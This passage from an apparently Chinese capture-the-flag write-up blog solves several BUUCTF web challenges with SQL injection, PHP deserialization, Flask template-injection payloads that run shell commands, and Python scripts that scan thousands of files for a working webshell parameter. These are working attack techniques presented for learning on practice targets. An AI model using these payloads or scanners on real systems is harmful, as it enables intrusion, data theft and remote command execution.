<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /view.php?no=<span class="number">15</span>%<span class="number">20</span>union%<span class="number">20</span><span class="comment">/*!selecT*/</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,%<span class="number">27</span>%<span class="number">4</span>f%<span class="number">3</span>a%<span class="number">38</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">55</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">66</span>%<span class="number">6</span>f%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">7</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">6</span>e%<span class="number">61</span>%<span class="number">6</span>d%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">36</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">63</span>%<span class="number">6</span>b%<span class="number">65</span>%<span class="number">72</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">33</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">61</span>%<span class="number">67</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">38</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">34</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">62</span>%<span class="number">6</span>c%<span class="number">6</span>f%<span class="number">67</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">73</span>%<span class="number">3</span>a%<span class="number">32</span>%<span class="number">39</span>%<span class="number">3</span>a%<span class="number">22</span>%<span class="number">66</span>%<span class="number">69</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">76</span>%<span class="number">61</span>%<span class="number">72</span>%<span class="number">2</span>f%<span class="number">77</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">2</span>f%<span class="number">68</span>%<span class="number">74</span>%<span class="number">6</span>d%<span class="number">6</span>c%<span class="number">2</span>f%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>%<span class="number">2</span>e%<span class="number">70</span>%<span class="number">68</span>%<span class="number">70</span>%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">7</span>d%<span class="number">27</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>4、读到flag.php，base64解码，或者直接浏览器中打开查看源码即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">77</span>f97643-dcd1<span class="number">-4206</span><span class="number">-801</span>d<span class="number">-2919297</span>b55ca&#125;</span><br></pre></td></tr></table></figure>

<p>细心才是王道啊！任何参数点都不能放过！</p>
<h3 id="十九、-极客大挑战-2019-HardSQL"><a href="#十九、-极客大挑战-2019-HardSQL" class="headerlink" title="十九、[极客大挑战 2019]HardSQL"></a>十九、[极客大挑战 2019]HardSQL</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/D9Pr7t"><img src="https://s3.ax1x.com/2020/11/13/D9Pr7t.png" alt="D9Pr7t.png"></a></p>
<p>老朋友了，就这？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span> </span><br></pre></td></tr></table></figure>

<p>啊！过滤空格、and、&amp;、|、还有substr等</p>
<p>过滤空格可以用括号前面学到了，但是过滤等号这里蒙B了，嘻嘻用like、rlike都可以，学到啦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,(select(right(group_concat(table_name),500))from(information_schema.columns)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span></span><br><span class="line">    </span><br><span class="line">XPATH syntax <span class="built_in">error</span>: <span class="string">&#x27;~H4rDsq1~&#x27;</span></span><br></pre></td></tr></table></figure>

<p>注出列名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,(select(right(group_concat(column_name),500))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span></span><br><span class="line"></span><br><span class="line">XPATH syntax <span class="built_in">error</span>: <span class="string">&#x27;~id,username,password~&#x27;</span></span><br></pre></td></tr></table></figure>

<p>left、right左右爆出即可！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span></span><br><span class="line"></span><br><span class="line">XPATH syntax <span class="built_in">error</span>: <span class="string">&#x27;~flag&#123;e4a637e3-26a3-40b8-9d97-dda1f2df2d00&#125;~&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="二十、-GXYCTF2019-BabySQli"><a href="#二十、-GXYCTF2019-BabySQli" class="headerlink" title="二十、[GXYCTF2019]BabySQli"></a>二十、[GXYCTF2019]BabySQli</h3><p>这道题的解题思路源于一篇熊海代码审计文章[<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&mid=2247485081&idx=1&sn=d4c7a4abfabef333c9879400ec91db31&chksm=9bdf45a3aca8ccb5de027516ca76c68affae33edbe36bd37a33d0ef5b064be4d94823da01015&mpshare=1&scene=23&srcid=11160K6GexBQhwGXXguR8zc8&sharer_sharetime=1605511748454&sharer_shareid=5c34ea9eacb30dd992454894a04902a5#rd">入门级CMS审计——哈拉少安全小队(公众号)</a>]</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span><span class="string">&#x27;%20unioN%20sElect%201,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">202</span>cb962ac59075b964b07152d234b70<span class="string">&#x27;%23&amp;pw=123</span></span><br></pre></td></tr></table></figure>

<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b48393e7<span class="number">-6</span>bcd<span class="number">-491e-89</span>d4<span class="number">-47</span>db442b201d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二十一、-网鼎杯-2020-青龙组-AreUSerialz"><a href="#二十一、-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="二十一、[网鼎杯 2020 青龙组]AreUSerialz"></a>二十一、[网鼎杯 2020 青龙组]AreUSerialz</h3><p>1、PHP7.1+反序列化时对类属性的访问控制关键字检测不是非常严格，带有protect、private访问控制关键字的变量经过序列化后正常带有%00的，在题目中is_valid()是限制了32-127的ASCII码才能进行反序列化。因此在PHP7+版本中可以构造这些特殊访问控制关键字的变量为public变量，public变量序列化后是没有%00的，并且反序列化后也正常。题目中所使用的PHP环境是PHP7.4.3,因此可行。</p>
<p>2、反序列化构造file_get_content使用php://filter读出flag.php中的flag</p>
<p>3、i:2数字类型对象属性绕过_destruct魔术方法全等逻辑</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9J2ZsYWd7NTY1NGFlZTAtZGY4My00ZWU5LWIxYTYtZWI2NTRlMWE5YjFkfSc7Cg==</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> $flag=<span class="string">&#x27;flag&#123;5654aee0-df83-4ee9-b1a6-eb654e1a9b1d&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注：在网鼎杯中，题目需要自行读取系统文件来得到网站根目录读取flag，这里学习到：/proc/self/cmdline文件，该文件记录某进程所执行的命令行，self是指当前进程。得到根目录的步骤：/proc/self/cmdline -&gt; /web/config/httpd.conf -&gt; /web/html/flag.php</strong></p>
<h3 id="二十二、-BJDCTF-2nd-fake-google"><a href="#二十二、-BJDCTF-2nd-fake-google" class="headerlink" title="二十二、[BJDCTF 2nd]fake google"></a>二十二、[BJDCTF 2nd]fake google</h3><p>Flask模板注入</p>
<p>漏洞源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,render_template_string,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>]=<span class="string">&#x27;sssssssSFSCFAS&#x27;</span></span><br><span class="line"><span class="meta">@app.route(&quot;/qaq&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;null&#x27;</span>)</span><br><span class="line">    t = <span class="string">&quot;&lt;!--ssssssti &amp; a little trick --&gt; P3&#x27;s girlfirend is : &#123;&#125;&lt;br&gt;&lt;hr&gt;&quot;</span>.format(name)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;BJD&quot;</span> <span class="keyword">in</span> render_template_string(t): <span class="comment">#just a trick</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BJD in P3&#x27;s gf&#x27;s name !!!!!???&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;DJB&quot;</span> <span class="keyword">in</span> render_template_string(t):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;DJB in P3&#x27;s gf&#x27;s name !!!!!???&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;&#123;[].<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">169</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>

<p>Flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eaa9f2c0<span class="number">-0</span>aea<span class="number">-47</span>ac<span class="number">-9</span>da2<span class="number">-297</span>c0566d208&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二十三、-强网杯-2019-高明的黑客"><a href="#二十三、-强网杯-2019-高明的黑客" class="headerlink" title="二十三、[强网杯 2019]高明的黑客"></a>二十三、[强网杯 2019]高明的黑客</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Dm5hwt"><img src="https://s3.ax1x.com/2020/11/18/Dm5hwt.png" alt="Dm5hwt.png"></a></p>
<p>​    特变态！2000多个文件，上万个可传参数，其中可能有某个参数可Getshell！    </p>
<p>​    这个脚本敲了几乎一下午…学习了一下python多线程与tpdm库进度条的用法，并且对正则表达式的使用进一步学习。</p>
<p><strong>自己敲版本1</strong>：以危险参数为单位正则进行构造payload、单线程（慢!!!）</p>
<p><strong>自己敲版本2</strong>：getshell本质不就是传入参数嘛！获得每个文件中所有GET、POST参数来测试GETSHELL即可！每个文件的每个GET参数我都request一次，多线程（慢!!）</p>
<p><strong>学习敲版本3</strong>：明明http协议可以一次性传入多个参数啊！搞毛!request是最占时间的，一次性获得一个文件所有参数（包括POST但我这里只测试了GET的一句话），然后只传一次就OK了啊！时间复杂度直接降了一个量级。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">author: 2h0nG</span></span><br><span class="line"><span class="string">description:Only test &quot;GET&quot; param. In fact, &quot;POST&quot; param also should be tested.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re, requests, os</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">thread_get_shell</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, file_</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.content = open(dir_name+file_, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">        self.file_ = file_</span><br><span class="line">        self.url = url</span><br><span class="line"></span><br><span class="line">    <span class="comment">#执着的执行一个HTTP请求，直到服务器恢复200状态码，且记录错误信息在error.log</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">real_request</span>(<span class="params">self, params</span>):</span></span><br><span class="line">        error_log = open(os.path.dirname(__file__)+<span class="string">&#x27;\error.log&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        respon = requests.get(url+self.file_, params = params)</span><br><span class="line">        <span class="keyword">while</span> respon.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">                error = <span class="string">&#x27;page &#x27;</span> + str(respon.status_code) + <span class="string">&#x27;: &#x27;</span> + respon.request.url + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                error_log.write(error)</span><br><span class="line">                <span class="comment">#print(&#x27;\n\033[0;31;40mpage &#x27; + str(respon.status_code) + &#x27;: &#x27; + respon.request.url + &#x27;\033[0m&#x27;)</span></span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">            respon = requests.get(url+self.file_, params = params)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        error_log.close()</span><br><span class="line">        <span class="keyword">return</span> respon</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        pattern = re.compile(<span class="string">r&quot;(?&lt;=\$_GET\[&#x27;)[a-zA-Z0-9]+(?=&#x27;\])&quot;</span>)  </span><br><span class="line">        params = &#123;&#125;</span><br><span class="line">        all_keys = set(pattern.findall(self.content))</span><br><span class="line">        <span class="comment">#将当前php文件中所有可传GET参数的key保存为dict，一次性全部发送测试getshell</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> all_keys:</span><br><span class="line">            params[key] = <span class="string">&quot;echo zhongjiacheng&quot;</span></span><br><span class="line">        respon = self.real_request(params)</span><br><span class="line">        <span class="comment">#一旦发现成功getshell，则逐个解析出密码参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;zhongjiacheng&#x27;</span> <span class="keyword">in</span> respon.text:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> all_keys:</span><br><span class="line">                respon = self.real_request(&#123;i : <span class="string">&#x27;echo zhongjiacheng&#x27;</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;zhongjiacheng&#x27;</span> <span class="keyword">in</span> respon.text:</span><br><span class="line">                    success = <span class="string">&quot;webshell ==&gt; &quot;</span> + self.file_ + <span class="string">&quot; ; key = &quot;</span> + i + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                    print(<span class="string">&quot;\n\033[0;32;40mwebshell ==&gt; &quot;</span> + self.file_ + <span class="string">&quot; ; key = &quot;</span> + i + <span class="string">&#x27;\033[0m&#x27;</span>)</span><br><span class="line">                    open(os.path.dirname(__file__)+<span class="string">&#x27;\success.log&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>).write(success)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dir_name = <span class="string">&quot;C:/Users/18265/Downloads/www/src/&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://8c7e3e67-09dd-4fc4-be24-00ea25216166.node3.buuoj.cn/&quot;</span></span><br><span class="line">    files = os.listdir(dir_name)</span><br><span class="line">    all_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(dir_name)]</span><br><span class="line">    <span class="keyword">for</span> file_index <span class="keyword">in</span> tqdm(files[<span class="number">0</span>:]):</span><br><span class="line">        <span class="keyword">while</span> threading.active_count() &gt; <span class="number">100</span>:</span><br><span class="line">           <span class="keyword">continue</span></span><br><span class="line">        th_get = thread_get_shell(url, file_index)</span><br><span class="line">        th_get.start()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DmfHSJ"><img src="https://s3.ax1x.com/2020/11/18/DmfHSJ.png" alt="DmfHSJ.png"></a></p>
<p>Flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c3ee43f0-baa5<span class="number">-42</span>b2-bb82-e3af2a05e58f&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注：另外我的脚本多线程是以class为单位，这里Copy某位大佬的以函数为单位的多线程python脚本，以供未来使用。这里有一点不清楚的是对于python变量作用域的问题，下面展示的脚本限制线程数的方法是使用了信号量，这里的信号量变量全局有效，且线程间共享。以Class为单位没有想出线程间共享全局信号量变量的方法。</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                                            <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/Users/18265/Downloads/www/src/&quot;</span></span><br><span class="line">os.chdir(filePath)                                                    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                                <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                             <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()                                                </span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                            <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">        gets = list(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">        posts = list(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                                        <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                                        <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://bc614ec1-f50c-4a4e-befa-badae1940973.node3.buuoj.cn/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)            <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                                    <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                                    <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span 